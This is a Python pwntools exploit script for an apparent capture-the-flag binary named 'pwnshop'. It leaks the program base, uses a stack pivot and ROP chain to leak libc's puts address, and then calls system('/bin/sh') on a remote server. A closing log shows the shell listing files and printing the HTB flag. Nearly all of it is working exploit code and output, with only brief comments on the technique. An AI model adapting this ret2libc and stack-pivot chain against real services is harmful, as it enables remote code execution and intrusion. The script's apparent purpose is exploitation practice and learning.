#stack pivot + buffer overflow

from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

elf = ELF('./pwnshop')

#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#io = process('./pwnshop')
#io = gdb.debug('./pwnshop', 'break main')

libc = ELF('./libc6_2.23-0ubuntu11.2_amd64.so')
ip, port = '178.62.40.97', 32361
io = remote(ip, port)

io.sendlineafter('> ', '2')
io.sendlineafter('What do you wish to sell? ', '1')
io.sendafter('How much do you want for it? ', '12345678')  #sendlineafter may cause problem in the following inputs seq...
buf = io.recvline().split('? ')[1]
elf_base = u64(buf[8:].ljust(8,'\x00')) - 0x40c0
print hex(elf_base)

#stack pivot
#the buy function doesn't push rbp! we directly overwrite rip, but only one rop gadget, so need stack pivot
#0x0000000000001219 : sub rsp, 0x28 ; ret

stack_pivot = elf_base + 0x0000000000001219
pop_rdi_ret = elf_base + 0x00000000000013c3
got_puts = elf_base + elf.got.puts
plt_puts = elf_base + 0x1030
ret = elf_base + 0x132a
#main = elf_base + 0x10a0

io.sendlineafter('>', '1')
padding = 'A'*(72-0x28+8)   #72+8 -> 80, 80 - 0x28 -> 40
payload = padding
payload += p64(pop_rdi_ret)
payload += p64(got_puts)
payload += p64(plt_puts)
payload += p64(ret)
payload += 'A'*(0x28-4*8-8)
payload += p64(stack_pivot)
io.sendafter('Enter details:', payload)
buf = io.recvline().strip()

print hex(u64(buf.ljust(8,'\x00')))
#get puts address and search in https://libc.blukat.me/
print hex(libc.symbols['puts'])

puts_addr = u64(buf.ljust(8,'\x00'))
server_libc_base = puts_addr - libc.symbols['puts']
log.info("Leaked server's libc base address: "+hex(server_libc_base))

libc.address = server_libc_base

#rop_libc.call(libc.symbols['system'], [next(libc.search(b'/bin/sh\x00'))])
padding = 'A'*(72-0x28+8)
payload = padding
payload += p64(pop_rdi_ret)
print hex(pop_rdi_ret)
bash_addr = next(libc.search(b'/bin/sh\x00'))
payload += p64(bash_addr)
print hex(bash_addr)
payload += p64(libc.symbols['system'])
print hex(libc.symbols['system'])
payload += p64(ret)
payload += 'A'*(0x28-4*8-8)
payload += p64(stack_pivot)

io.sendafter('Enter details:', payload)

io.interactive()

'''
Very tricky! 1) change sendlineafter() to sendafter(). 2) directly try remote part, and try several times!

[*] Switching to interactive mode
 $ ls
[DEBUG] Sent 0x3 bytes:
    'ls\n'
[DEBUG] Received 0x16 bytes:
    'core\n'
    'flag.txt\n'
    'pwnshop\n'
core
flag.txt
pwnshop
$ ls
[DEBUG] Sent 0x3 bytes:
    'ls\n'
[DEBUG] Received 0x16 bytes:
    'core\n'
    'flag.txt\n'
    'pwnshop\n'
core
flag.txt
pwnshop
$ cat flag.txt
[DEBUG] Sent 0xd bytes:
    'cat flag.txt\n'
[DEBUG] Received 0x26 bytes:
    'HTB{th1s_is_wh@t_I_c@ll_a_g00d_d3a1!}\n'
HTB{th1s_is_wh@t_I_c@ll_a_g00d_d3a1!}
[*] Got EOF while reading in interactive
$

'''
